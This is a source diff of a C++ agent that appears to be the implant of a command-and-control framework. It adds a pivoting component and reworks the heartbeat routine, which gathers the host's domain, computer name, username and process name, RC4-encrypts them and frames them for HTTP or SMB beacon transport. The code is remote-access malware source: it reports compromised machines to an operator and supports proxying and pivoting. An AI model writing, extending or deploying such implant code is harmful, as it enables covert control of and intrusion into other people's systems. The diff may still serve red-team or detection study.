@@ -2,7 +2,6 @@
 #include "ApiLoader.h"
 #include "utils.h"
 #include "Packer.h"
-#include "Encoders.h"
 #include "Crypt.h"
 
 Agent::Agent()
@@ -13,20 +12,23 @@ Agent::Agent()
 	config  = (AgentConfig*) MemAllocLocal(sizeof(AgentConfig));
 	*config = AgentConfig();
 
-	commander = (Commander*) MemAllocLocal(sizeof(AgentConfig));
+	commander  = (Commander*) MemAllocLocal(sizeof(AgentConfig));
 	*commander = Commander(this);
 
 	downloader  = (Downloader*) MemAllocLocal(sizeof(Downloader));
 	*downloader = Downloader( config->download_chunk_size );
 
-	jober = (JobsController*)MemAllocLocal(sizeof(JobsController));
+	jober  = (JobsController*)MemAllocLocal(sizeof(JobsController));
 	*jober = JobsController();
 
 	memorysaver  = (MemorySaver*)MemAllocLocal(sizeof(MemorySaver));
 	*memorysaver = MemorySaver();
 
-	proxyfire = (Proxyfire*)MemAllocLocal(sizeof(Proxyfire));
+	proxyfire  = (Proxyfire*)MemAllocLocal(sizeof(Proxyfire));
 	*proxyfire = Proxyfire();
+
+	pivotter  = (Pivotter*)MemAllocLocal(sizeof(Pivotter));
+	*pivotter = Pivotter();
 
 	SessionKey = (PBYTE) MemAllocLocal(16);
 	for (int i = 0; i < 16; i++)
@@ -45,7 +47,7 @@ BOOL Agent::IsActive()
 	return this->config->active;
 }
 
-LPSTR Agent::BuildBeat()
+BYTE* Agent::BuildBeat(ULONG* size)
 {
 	BYTE flag = 0;
 	flag += this->info->is_server; 
@@ -79,35 +81,33 @@ LPSTR Agent::BuildBeat()
 	packer->PackStringA(this->info->username);
 	packer->PackStringA(this->info->process_name);
 
-	PBYTE beat = packer->GetData();
-	ULONG beat_size = packer->GetDataSize();
+	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);
 
-	EncryptRC4(beat, beat_size, this->config->encrypt_key, 16);
+	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
+	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
+	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
+	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));
 
-	LPSTR encoded_beat = b64_encode(beat, beat_size);
+#if defined(BEACON_HTTP) 
 
-	return encoded_beat;
-}
+	ULONG beat_size = packer->datasize();
+	PBYTE beat      = packer->data();
 
-LPSTR Agent::CreateHeaders()
-{
-	LPSTR beat           = this->BuildBeat();
-	ULONG beat_length    = StrLenA(beat);
-	ULONG param_length   = StrLenA((CHAR*)this->config->parameter);
-	ULONG headers_length = StrLenA((CHAR*)this->config->http_headers);
+#elif defined(BEACON_SMB) 
 
-	CHAR* HttpHeaders = (CHAR*)MemAllocLocal(param_length + beat_length +  headers_length + 5);
-	memcpy(HttpHeaders, this->config->http_headers, headers_length);
-	ULONG index = headers_length;
-	memcpy(HttpHeaders + index, this->config->parameter, param_length);
-	index += param_length;
-	HttpHeaders[index++] = ':';
-	HttpHeaders[index++] = ' ';
-	memcpy(HttpHeaders + index, beat, beat_length);
-	index += beat_length;
-	HttpHeaders[index++] = '\r';
-	HttpHeaders[index++] = '\n';
-	HttpHeaders[index++] = 0;
+	ULONG beat_size = packer->datasize() + 4;
+	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
 
-	return HttpHeaders;
+	memcpy(beat, &(this->config->listener_type), 4);
+	memcpy(beat+4, packer->data(), packer->datasize());
+
+	PBYTE pdata = packer->data();
+	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
+
+#endif
+
+	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
+
+	*size = beat_size;
+	return beat;
 }
